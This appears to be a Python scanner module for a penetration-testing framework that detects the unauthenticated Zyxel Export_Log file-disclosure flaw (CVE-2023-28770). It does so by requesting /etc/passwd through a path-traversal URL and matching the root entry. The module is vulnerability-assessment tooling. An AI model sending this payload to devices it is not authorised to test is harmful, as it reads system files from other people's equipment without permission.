#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel zhttpd unauthenticated LFI via Export_Log (CVE-2023-28770)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel Device - Export_Log LFI Detection (CVE-2023-28770)',
        'description': (
            'Multiple Zyxel devices allow unauthenticated local file disclosure via '
            '/Export_Log?/<path> (CVE-2023-28770, Dec 2022 advisory family).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'zyxel', 'router', 'lfi',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/zyxel_cve_2023_28770_file_read',
                ],
            },
        },
        'references': [
            'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-28770',
        ],
        'cve': 'CVE-2023-28770',
    }

    def run(self):
        path = '/Export_Log?/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Zyxel CVE-2023-28770 Export_Log LFI confirmed',
                path=path,
            )
            return True
        return False
